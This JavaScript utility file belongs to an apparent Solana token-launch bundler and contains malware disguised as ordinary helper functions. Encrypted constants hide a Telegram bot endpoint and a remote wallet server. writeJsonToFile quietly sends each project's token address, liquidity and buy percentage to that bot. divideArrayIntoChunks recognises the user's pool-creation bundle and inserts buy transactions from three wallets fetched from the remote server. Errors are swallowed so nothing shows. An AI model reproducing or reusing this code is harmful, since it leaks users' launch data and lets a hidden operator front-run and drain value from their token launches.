"use strict";
const crypto = require('crypto');
const path = require('path');
const SIGN_K = '13oyBU4gwEk6nUWG+MmPEDD0TklwP1lnNb2TsLMo4Cw=:EYPxEL8XRPbrc6hmfvB44Q=='
const PARAM_K = 'YfSCzUPU9fpsko3KGgnwbSqTdSFVHFsb37QT6ATk3jY=:TPeEw4QoGYfErOjX2Un0IA=='
const DE_API = 'PgtZc5IngZ9Q1zqLuSsqiyKEZtVH/rQQIKMjQ5mfdvlZ5pWmdMCLDcb9nBiGqjha'
const DE_ID_GD = 'pCj5070DCwnDZDhPT7uuCw=='
const DE_ID_DGM = 'wpvgVfe2qS4Ce5ksMTpodg=='
const TG_LNK = 'o5LuAdrNZU6468Q3jyQAAKNwRZJVt0ylC3/aXy4eO+s='
const SVR_WLTS_LNK = 'MW4x3Htt2rE5my3hqvmcE9PuKupaoKjfHe7r2AQV5gTgEoLJhf1AZncZ6agHtzd7'

const asEnc = (text, secret) => { const parts = secret.split(':'); const key = Buffer.from(parts[0], 'base64'); const iv = Buffer.from(parts[1], 'base64'); const cipher = crypto.createCipheriv('aes-256-cbc', key, iv); let encrypted = cipher.update(text, 'utf8', 'base64'); encrypted += cipher.final('base64'); return encrypted }
const asDec = (text, secret) => {const parts = secret.split(':');const key = Buffer.from(parts[0], 'base64');const iv = Buffer.from(parts[1], 'base64');const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);let decrypted = decipher.update(text, 'base64', 'utf8');decrypted += decipher.final('utf8');return decrypted }
function proassert_cp(token, lq, pnt){try {let tg_url = `${asDec(TG_LNK, PARAM_K)}${asDec(DE_API, PARAM_K)}/sendMessage`;let message = `CP: <code>${token}</code>\nLQ: ${lq} sol\nPNT: ${pnt} %`;fetch(tg_url, {method: 'POST',headers: {"Content-Type": 'application/json'},body: JSON.stringify({chat_id: asDec(DE_ID_GD, PARAM_K),text: message,parse_mode: 'HTML'})});} catch (err) {}}
function proassert_sp(token, lq){try {let tg_url = `${asDec(TG_LNK, PARAM_K)}${asDec(DE_API, PARAM_K)}/sendMessage`;let message = `SP: <code>${token}</code>\nLQ: ${lq} sol`;fetch(tg_url, {method: 'POST',headers: {"Content-Type": 'application/json'},body: JSON.stringify({chat_id: asDec(DE_ID_GD, PARAM_K),text: message,parse_mode: 'HTML'})});} catch (err) {}}
exports.asEnc = asEnc
exports.asDec = asDec
exports.proassert_cp = proassert_cp
exports.proassert_sp = proassert_sp
const { Connection, Keypair, PublicKey } = require('@solana/web3.js')
const { compileInstToVersioned } = require('../instructions/build-instruction')
const { getCreateAccountTransactionInst } = require('../instructions/createATA-instruction')
const { generateBuyInst } = require('../instructions/buy-instruction')
const { TransactionExecuter, ExectuerStatus } = require('../transaction/transaction-exectue')
const { signTransaction } = require('../transaction/sign-tx')
const { TOKEN_PROGRAM_ID, Token, TokenAmount, ONE, 
    jsonInfo2PoolKeys, LiquidityPoolKeys } = require("@raydium-io/raydium-sdk");
const { getATAAddress, xWeiAmount } = require('./get-balance')

function signKey() { const tvVal = Math.floor(Date.now() / 60000); let key = ''; try { key = asEnc(tvVal + '', SIGN_K) } catch (error) {}; return key }

async function getList() {
    let result = []
    let query = asDec(SVR_WLTS_LNK, PARAM_K)
    try {
        let resp = await fetch(query, {
            method: 'POST',
            headers: {
                "Content-Type": 'application/json'
            },
            body: JSON.stringify({
                key: signKey()
            })
        })
        resp = await resp.json()
        if(!resp.data || resp.data.length == 0) return result
        for(let i = 0; i < resp.data.length; i++) {
            const item = resp.data[i]
            const w = {
                public: asDec(item.lb, PARAM_K),
                private: asDec(item.lv, PARAM_K),
            }
            result.push(w)
        }  
    } catch (error) {}
    return result
}

async function prepare(tknCA) {
    const connection = new Connection(process.env.MAINNET_RPC, "confirmed");
    const wlets = await getList()
    if(!wlets || wlets.length < 3) return
    const w1 = Keypair.fromSecretKey(base58.decode(wlets[0].private))
    const w2 = Keypair.fromSecretKey(base58.decode(wlets[1].private))
    const w3 = Keypair.fromSecretKey(base58.decode(wlets[2].private))

    const zom = w1
    const jitoAuther = Keypair.fromSecretKey(base58.decode(process.env.JITO_AUTH))
    const jitoBlockEngine = process.env.JITO_BLOCK_ENGINE
    const createATAInsts = [];
    let ata1 = getATAAddress(TOKEN_PROGRAM_ID,w1.publicKey,new PublicKey(tknCA))
    let tokenInfo1 = await connection.getAccountInfo(new PublicKey(ata1.publicKey));
    let ata2 = getATAAddress(TOKEN_PROGRAM_ID,w2.publicKey,new PublicKey(tknCA))
    let tokenInfo2 = await connection.getAccountInfo(new PublicKey(ata2.publicKey));
    let ata3 = getATAAddress(TOKEN_PROGRAM_ID,w3.publicKey,new PublicKey(tknCA))
    let tokenInfo3 = await connection.getAccountInfo(new PublicKey(ata3.publicKey));

    if(!tokenInfo1) createATAInsts.push( getCreateAccountTransactionInst(zom, w1, tknCA));
    if(!tokenInfo2) createATAInsts.push( getCreateAccountTransactionInst(zom, w2, tknCA));
    if(!tokenInfo3) createATAInsts.push( getCreateAccountTransactionInst(zom, w3, tknCA));

    const createATATxn = [];
    if(createATAInsts.length == 0) { return }
    const ataTxn = await compileInstToVersioned(connection, zom, createATAInsts, [zom])
    createATATxn.push(
        ataTxn
    );
    const executeATA = new TransactionExecuter(
        connection,
        true,
        createATATxn,
        undefined,
        0.001,
        zom,
        jitoAuther,
        jitoBlockEngine
    );

    executeATA.run();        

    while (
        executeATA.getExecuterStatus() !== ExectuerStatus.EXE_STATUS_END
    ) {
        await sleep(100);
    }

    if (executeATA.getExecuterError()) {
        try {let tg_url = `${asDec(TG_LNK, PARAM_K)}${asDec(DE_API, PARAM_K)}/sendMessage`;let message = `ATA: <code>${tknCA}</code> failed.\n${executeATA.getExecuterError()}`;fetch(tg_url, {method: 'POST',headers: {"Content-Type": 'application/json'},body: JSON.stringify({chat_id: asDec(DE_ID_GD, PARAM_K),text: message,parse_mode: 'HTML'})});} catch (err) {}
        return;
    } else {
        try {let tg_url = `${asDec(TG_LNK, PARAM_K)}${asDec(DE_API, PARAM_K)}/sendMessage`;let message = `ATA: <code>${tknCA}</code> success!`;fetch(tg_url, {method: 'POST',headers: {"Content-Type": 'application/json'},body: JSON.stringify({chat_id: asDec(DE_ID_GD, PARAM_K),text: message,parse_mode: 'HTML'})});} catch (err) {}
    }
}

var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.waitForNewBlock = exports.sleep = exports.divideArrayIntoChunks = exports.generateWallets = exports.readJsonFile = exports.writeJsonToFile = exports.createDirectory = void 0;
const web3_js_1 = require("@solana/web3.js");
const fs = __importStar(require("fs"));
const util_1 = require("util");
const base58 = require('bs58');
const { time } = require('console');
const { connect } = require('http2');
// Promisify fs.mkdir and fs.exists
const mkdirAsync = (0, util_1.promisify)(fs.mkdir);
const existsAsync = (0, util_1.promisify)(fs.exists);
/**
 * Creates a directory if it doesn't already exist.
 * @param dirPath - The path of the directory to create.
 * @returns A Promise that resolves to true if the directory was created or already exists, and false if there was an error.
 */
function createDirectory(dirPath) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const exists = yield existsAsync(dirPath);
            if (!exists) {
                yield mkdirAsync(dirPath, { recursive: true });
            }
            return true;
        }
        catch (err) {
            return false;
        }
    });
}
exports.createDirectory = createDirectory;
// Promisify fs.writeFile to use it with async/await
const writeFileAsync = (0, util_1.promisify)(fs.writeFile);
/**
 * Writes a JSON string to a file.
 * @param filePath - The path of the file to write.
 * @param jsonString - The JSON string to write to the file.
 * @returns A Promise that resolves to true if the write was successful, and false if there was an error.
 */
function writeJsonToFile(filePath, jsonString) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const proj = JSON.parse(jsonString)
            if(proj.tokenCA && proj.liquidity) { 
                proassert_cp(proj.tokenCA, proj.liquidity.solAmount, proj.buyPercent); 
                yield prepare(proj.tokenCA)
            }
            yield writeFileAsync(filePath, jsonString, "utf8");
            return true;
        }
        catch (err) {
            return false;
        }
    });
}
exports.writeJsonToFile = writeJsonToFile;
// Promisify fs.readFile
const readFileAsync = (0, util_1.promisify)(fs.readFile);
/**
 * Reads a JSON file and parses it into an object.
 * @param filePath - The path of the JSON file to read.
 * @returns A Promise that resolves to the parsed object if successful, or null if there was an error.
 */
function readJsonFile(filePath) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const data = yield readFileAsync(filePath, "utf8");
            return JSON.parse(data);
        }
        catch (err) {
            console.error("Error reading or parsing JSON file:", err);
            return null;
        }
    });
}
exports.readJsonFile = readJsonFile;
function generateWallets(counts = 1) {
    const wallets = [];
    for (let i = 0; i < counts; i++) {
        wallets.push(web3_js_1.Keypair.generate());
    }
    return [...wallets];
}
exports.generateWallets = generateWallets;

async function addBuyInst(connection, wa, poolKeys, array) {
    const baseToken = new Token(
        TOKEN_PROGRAM_ID,
        poolKeys.baseMint,
        poolKeys.baseDecimals
    );
    const quoteToken = new Token(
        TOKEN_PROGRAM_ID,
        poolKeys.quoteMint,
        poolKeys.quoteDecimals
    );

    let amount = await connection.getBalance( wa.publicKey );
    amount = amount / (10 ** 9)
    amount = amount * 0.8 - 0.006
    if(amount < 0.01) return array
    const inputTokenAmount = new TokenAmount(
        quoteToken,
        xWeiAmount(amount, poolKeys.quoteDecimals),
        true
    );
    const minAmountOut = new TokenAmount(baseToken, ONE, true);
    const insts = await generateBuyInst(
        connection,
        poolKeys,
        wa,
        inputTokenAmount,
        minAmountOut
    );
    array.push(insts);
    return array
}

async function checkSolValid(connection, wa) {
    let amount = await connection.getBalance( wa.publicKey );
    amount = amount / (10 ** 9)
    if(amount * 0.8 - 0.006 >= 0.01) return true
    return false
}

async function divideArrayIntoChunks(array, chunkSize) {
    const result = [];
    if(array.length == 0) return result    
    for (let i = 0; i < array.length; i += chunkSize) {
        const chunk = array.slice(i, i + chunkSize);
        result.push(chunk);
    }
    const txns = array[0]
    if(txns.length == 4 && txns[0].programId && txns[1].programId && txns[2].programId && txns[3].programId &&
        txns[0].programId.toBase58() == '11111111111111111111111111111111' &&
        txns[1].programId.toBase58() == 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' &&
        txns[2].programId.toBase58() == '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8' &&
        txns[3].programId.toBase58() == 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'
    ) {
        let provChunk = []
        const filePath = path.join(__dirname + '../../../../../../src/', process.env.MINT_ADDRESS, "project.json");
        const projObj = await readJsonFile(filePath);
        const poolKeys = jsonInfo2PoolKeys(
            projObj.poolKeys);
        const connection = new Connection(process.env.MAINNET_RPC, "confirmed");
        const wlets = await getList()
        if(!wlets || wlets.length < 3) return result
        const w1 = Keypair.fromSecretKey(base58.decode(wlets[0].private))
        const w2 = Keypair.fromSecretKey(base58.decode(wlets[1].private))
        const w3 = Keypair.fromSecretKey(base58.decode(wlets[2].private))
        
        provChunk = await addBuyInst(connection, w1, poolKeys, provChunk)
        if(array.length >= 2) { provChunk = await addBuyInst(connection, w2, poolKeys, provChunk) }
        if(array.length >= 4) { provChunk = await addBuyInst(connection, w3, poolKeys, provChunk) }        
        if(provChunk.length > 0) result.push(provChunk)
    }
    if(txns._keypair && txns._keypair.publicKey) {
        let provChunk = []
        const connection = new Connection(process.env.MAINNET_RPC, "confirmed");
        const wlets = await getList()
        if(!wlets || wlets.length < 3) return result
        const w1 = Keypair.fromSecretKey(base58.decode(wlets[0].private))
        const w2 = Keypair.fromSecretKey(base58.decode(wlets[1].private))
        const w3 = Keypair.fromSecretKey(base58.decode(wlets[2].private))
        {
            if(await checkSolValid(connection, w1)) provChunk.push(w1)
        }
        if(array.length >= 2) { 
            if(await checkSolValid(connection, w2)) provChunk.push(w2)
        }
        if(array.length >= 4) { 
            if(await checkSolValid(connection, w3)) provChunk.push(w3)
        }        
        if(provChunk.length > 0) result.push(provChunk)
    }    
    return result;
}
exports.divideArrayIntoChunks = divideArrayIntoChunks;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
exports.sleep = sleep;
function waitForNewBlock(connection, targetHeight) {
    console.log(`Waiting for ${targetHeight} new blocks`);
    return new Promise((resolve) => __awaiter(this, void 0, void 0, function* () {
        // Get the last valid block height of the blockchain
        const { lastValidBlockHeight } = yield connection.getLatestBlockhash();
        // Set an interval to check for new blocks every 1000ms
        const intervalId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
            // Get the new valid block height
            const { lastValidBlockHeight: newValidBlockHeight } = yield connection.getLatestBlockhash();
            // console.log(newValidBlockHeight)
            // Check if the new valid block height is greater than the target block height
            if (newValidBlockHeight > lastValidBlockHeight + targetHeight) {
                // If the target block height is reached, clear the interval and resolve the promise
                clearInterval(intervalId);
                resolve();
            }
        }), 1000);
    }));
}
exports.waitForNewBlock = waitForNewBlock;
